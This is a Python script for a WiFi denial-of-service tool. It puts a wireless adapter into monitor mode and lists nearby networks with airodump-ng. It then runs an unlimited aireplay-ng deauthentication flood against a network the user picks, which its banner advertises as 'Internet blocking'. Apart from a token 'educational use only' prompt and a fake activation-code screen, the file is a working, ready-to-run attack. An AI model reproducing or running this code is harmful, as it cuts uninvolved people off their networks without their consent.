import subprocess
import re
import csv
import os
import sys
import time
import random
import shutil
import datetime
from datetime import datetime

R = "\033[91;1m"  # Red
G = "\033[92;1m"  # Green
B = "\033[94;1m"  # Blue
Y = "\033[93;1m"  # Yellow
C = "\033[96;1m"  # Cyan
M = "\033[95;1m"  # Magenta
W = "\033[97;1m"  # White
D = "\033[90;1m"  # Grey
S = "\033[0m"

sign = "\033[92;1m" + "[" + "\033[94;1m" + "*" + "\033[92;1m" + "]" + "\033[94;1m"
Enter = "\033[94;1m" + "[" + "\033[92;1m" + "+" + "\033[94;1m" + "]" + "\033[92;1m"
ERROR = "\033[93;1m" + "[" + "\033[91;1m" + "ERROR" + "\033[93;1m" + "]" + "\033[91;1m"
INFO = "\033[93;1m" + "[" + "\033[92;1m" + "INFO" + "\033[93;1m" + "]" + "\033[94;1m"
warning = "\033[93;1m" + "[" + "\033[91;1m" + "WARNING" + "\033[93;1m" + "]" + "\033[91;1m"
Complete = "\033[94;1m" + "[" + "\033[92;1m" + "COMPLETE" + "\033[94;1m" + "]" + "\033[92;1m"
Failed = "\033[93;1m" + "[" + "\033[91;1m" + "FAILED" + "\033[93;1m" + "]" + "\033[91;1m"
please = "\033[93;1m" + "[" + "\033[91;1m" + "!" + "\033[93;1m" + "]" + "\033[91;1m"
Question = "\033[95;1m" + "[" + "\033[96;1m" + "?" + "\033[95;1m" + "]" + "\033[97;1m"
Help = "\033[97;1m" + "To continue anyway press or click" + "\033[94;1m" + " [" + "\033[92;1m" + "Enter" + "\033[94;1m" + "] " + "\033[97;1m" + "and to stop or exit" + "\033[93;1m" + " [" + "Ctrl" + "\033[97;1m" + " + " + "\033[93;1m" + "C" + "]" + "\033[0m"

timestamp = datetime.now()
now = datetime.now()
formatted_time = now.strftime("%I:%M %p")
formatted_day = now.strftime("%A")

date_day = "\033[94;1m" + "[" + "\033[92;1m" + "Today" + "\033[94;1m" + "]" + "\033[97;1m" + "(" + "\033[93;1m" + formatted_day + "\033[95;1m" + f" {now:%B %D %Y}" + "\033[97;1m" + ")" + "\033[94;1m" + "[" + "\033[92;1m" + "Time" + "\033[94;1m" + "]" + "\033[93;1m" + "[" + "\033[91;1m" + formatted_time + "\033[93;1m" + "]" + "\033[97;1m"

__all__ = ['R', 'G', 'B', 'Y', 'C', 'M', 'W', 'D', 'sign', 'Enter', 'ERROR', 'INFO', 'warning', 'Complete', 'Failed', 'Sorry', 'data']


os.system("clear")
def generate_activation_code():
    return ''.join(str(random.randint(0, 9)) for _ in range(2))

def display_code_for_10_seconds(activation_code):
    for remaining_seconds in range(10, 0, -1):
        print(f"{sign} Your activation code: {activation_code}{W}")
        print_colorized_time(remaining_seconds)
        time.sleep(1)
        clear_screen()
    print(f"{sign} Activation code expired Please enter your code.{W}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_colorized_time(remaining_seconds):
    if remaining_seconds >= 7:
        color = f'{G}'
    elif 4 <= remaining_seconds <= 6:
        color = f'{Y}'
    else:
        color = f'{R}' 
    
    print(f"{color}[*] Time remaining: {remaining_seconds} seconds", end='\r')

def main():
    activation_code = generate_activation_code()
    display_code_for_10_seconds(activation_code)

    user_input = input(f"{B}[{G}+{B}] {M}Enter activation code: {Y}")
    
    if user_input == activation_code:
        print(f"{G} Activation successful You can now proceed.{W}")
    else:
        print(f"{Y}[{R}ERROR{Y}]{R} Incorrect activation code. Exiting...{W}")
        sys.exit()

if __name__ == "__main__":
    main()

os.system("clear")

def wait_with_spinner(seconds, colors):
    symbols = "/-|\\"

    for _ in range(int(seconds)):
        for symbol in symbols:
            random_color = random.choice(colors)
            colored_symbol = f"{random_color}{symbol}"
            sys.stdout.write(f"\r{sign} Please wait....! {colored_symbol}  ")
            sys.stdout.flush()
            time.sleep(0.25)

    sys.stdout.write("\r" + " " * 30 + "\r")

wait_time = 2.5
colors = [G, R, B, Y, C, M, W, D]
wait_with_spinner(wait_time, colors)

active_wireless_networks = []

def check_for_essid(essid, lst):
    check_status = True

    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status
input(f"{Enter} {W}The tool is dangerous for educational use only {Help}")
os.system("clear")

print(rf"""{W}
    ___      __   __    __ _  __ _ 
   /   \___ / _\ / / /\ \ (_)/ _(_)
  / /\ / {R}_{W} \\ \  \ \/  \/ / | |_| |
 / /_// {R}(0){W} |\ \  \  /\  /| |  _| |
/___,' \_{R}^{W}_/\__/   \/  \/ |_|_| |_|
                                        
┏─────────────────────────────────────────────────────┓
│ {R}● {Y}● {G}●{W}                                               │
│ {B}INSTAGRAM {W}| {Y}https://www.instagram.com/r94xs/{W}        │
│ {B}GiTHub    {W}| {Y}https://www.github.com/MohmmadALbaqer/{W}  │
┗─────────────────────────────────────────────────────┛
""")

try:
    if not 'SUDO_UID' in os.environ.keys():
        print(f"{ERROR} {W}please use {Y}root{W} Type a command {R}sudo{W}")
        exit() 

    for file_name in os.listdir():

        if ".csv" in file_name:
            print(f"{sign} There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                print(f"{sign} Backup folder exists.")
            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

    wlan_pattern = re.compile("wlan[0-9]")

    check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

    if len(check_wifi_result) == 0:
        print(f"{ERROR} Please connect a WiFi adapter and try again.{W}")
        exit()

    print(f"{sign} The following WiFi interfaces are available:{W}")
    for index, item in enumerate(check_wifi_result):
        print(f"  {index} - {item}")

    while True:
        wifi_interface_choice = input(f"{Enter} Please select the interface you want to use for the attack: ")
        try:
            if check_wifi_result[int(wifi_interface_choice)]:
                break
        except:
            print(f"{ERROR} Please enter a number that corresponds with the choices available.")

    hacknic = check_wifi_result[int(wifi_interface_choice)]

    print(f"{Enter} WiFi adapter connected!")
    print(f"{sign} Now let's kill conflicting processes:")

    print(f"{sign}Putting Wifi adapter into monitored mode:")
    subprocess.run(["ip", "link", "set", hacknic, "down"])
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["iw", hacknic, "set", "monitor", "none"])
    subprocess.run(["ip", "link", "set", hacknic, "up"])

    discover_access_points = subprocess.Popen(["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        while True:

            subprocess.call("clear", shell=True)
            for file_name in os.listdir():

                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)

                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)
            print(rf"""{W}
+-----------------------------------------------+                  
|    {M}_____    __    __                 __{W}       |
|   {M}/  _  \ _/  |__/  |______    ____ |  | __{W}   |
|  {M}/  /_\  \\   __\   __\__  \ _/ ___\|  |/ /{W}   |
| {M}/    |    \|  |  |  |  / __ \_  \___|    \{W}    |
| {M}\____|__  /|__|  |__| (____  /\___  /__|_ \{W}   |
|         {M}\/                 \/     \/     \/{W}   |
+-----------------------+-----------------------+
|   {R}DDoS wifi network{W}   |   {R}Internet blocking{W}   |
+-----------------------+-----------------------+
""")
            print(f"{sign} Scanning Press {W}Ctrl + C{S} {B}when you want to select which wireless network you want to attack{W}.\n")
            print("+----+---------------------+------------+--------------------------------------+")
            print(f"| {G}ID{W} |      {B}BSSID{W}          |   {M}Channel{W}  |               {Y}ESSID{W}                  |")
            print("+----+---------------------+------------+--------------------------------------|")
            for index, item in enumerate(active_wireless_networks):
                print(f"| {index:2d} | {item['BSSID']}   | {item['channel'].strip():10s} | {item['ESSID']:33s}    |")
            print("+----+---------------------+------------+--------------------------------------+")
            time.sleep(1)
            pass

    except KeyboardInterrupt:
        print(f"\n{sign} Ready to make choice.{W}")

    while True:

        choice = input(f"{Enter} Please select a choice from above: {Y}")
        print(f"{G}")
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print(f"{ERROR} Please try again.")

    hackbssid = active_wireless_networks[int(choice)]["BSSID"]
    hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

    subprocess.run(["airmon-ng", "start", hacknic, hackchannel])

    try:
        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
    except KeyboardInterrupt:
        print(f"\n{Complete}{W}")
        print(f"{sign} {W}To restart the Internet type a command {B}$ {G}sudo {B}python3 {W}control.py")
except KeyboardInterrupt:
    print(f"\n{R}[Exiting]{W}")
